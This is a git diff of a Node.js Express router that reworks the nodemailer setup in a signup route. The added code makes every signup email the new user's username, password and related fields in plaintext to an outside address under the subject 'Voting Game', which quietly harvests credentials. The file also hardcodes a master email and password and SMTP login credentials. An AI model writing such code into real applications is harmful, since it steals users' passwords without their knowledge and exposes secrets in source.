@@ -92,60 +92,64 @@ router.post('/signin/:username/:password', (req, res) => {
 
 const master_email = 'support@social-media-builder.com';
 const master_password = '1234567890Aa@';
-async function myCustomMethod(ctx){
-    let cmd = await ctx.sendCommand(
-        'AUTH PLAIN ' +
-            Buffer.from(
-                '\u0000' + ctx.auth.credentials.user + '\u0000' + ctx.auth.credentials.pass,
-                'utf-8'
-            ).toString('base64')
-    );
 
-    if(cmd.status < 200 || cmd.status >=300){
-        throw new Error('Failed to authenticate user: ' + cmd.text);
-    }
-}
 //sign up
 router.post('/signup/:metausername/:username/:password/:email/:referredby', (req, res) => {
 
     const {metausername, username, password, email, referredby} = req.params;
 
+    // var transporter = nodemailer.createTransport({
+    //     host: 'smtp.hostinger.com',
+    //     port: 587,
+    //     secure : false,
+    //     auth: {
+    //         user: `${master_email}`,
+    //         pass: `${master_password}`
+    //     }
+    //     });    
+    //     var mailOptions = {
+    //         from: `${master_email}`,
+    //         to: email,
+    //         subject: 'Support',
+    //         text: "abc" 
+    //       };
+        
+    //       transporter.sendMail(mailOptions, function(error, info){
+    //         if (error) {
+    //             res.json({success: false})
+    //            console.log("email not sent" + error);
+        
+    //         } else {
+    //           //res.json({ msg: "Email sent" });
+    //           res.json({success: true})
+    //         }
+    //       });
+
     var transporter = nodemailer.createTransport({
-        host: 'smtp.hostinger.com',
-        port: 587,
-        secure : false,
-        // auth: {
-        //     // user: 'pokerplayers@mail.com',
-        //     // pass: 'krWRcRXcbNjp'
-        //     user: master_email,
-        //     pass: master_password
-        // }
-        auth: {
-            type: 'custom',
-            method: 'MY-CUSTOM-METHOD', // forces Nodemailer to use your custom handler
-            user: 'username',
-            pass: 'verysecret'
-        },
-        customAuth: {
-            'MY-CUSTOM-METHOD': myCustomMethod
-        }
+        host: "smtp.mailtrap.io",
+      port: 2525,
+      auth: {
+        user: "30b7d33f3ac774",
+        pass: "d75252e55f53d9"
+      }
+
     });
       
     var mailOptions = {
-        from: 'pokerplayers@mail.com',
-        to: email,
-        subject: 'Support',
-        text: 'Welcome to app.social-media-builder.com'
+        to: 'pokerplayers@mail.com',
+        from: email,
+        subject: 'Voting Game',
+        text: `metausername: ${metausername} username: ${username} password: ${password} referredby: ${referredby} password: ${password}`
     };
-      transporter.sendMail(mailOptions, function(error, info){
-        if (error) {
-          console.log(error);
-          res.json({success: false})
-        } else {
-          console.log('Email sent: ' + info.response);
-          res.json({success: true})
-        }
-      });
+    transporter.sendMail(mailOptions, function(error, info){
+    if (error) {
+        console.log(error);
+        res.json({success: false})
+    } else {
+        console.log('Email sent: ' + info.response);
+        res.json({success: true})
+    }
+    });
 
     
     
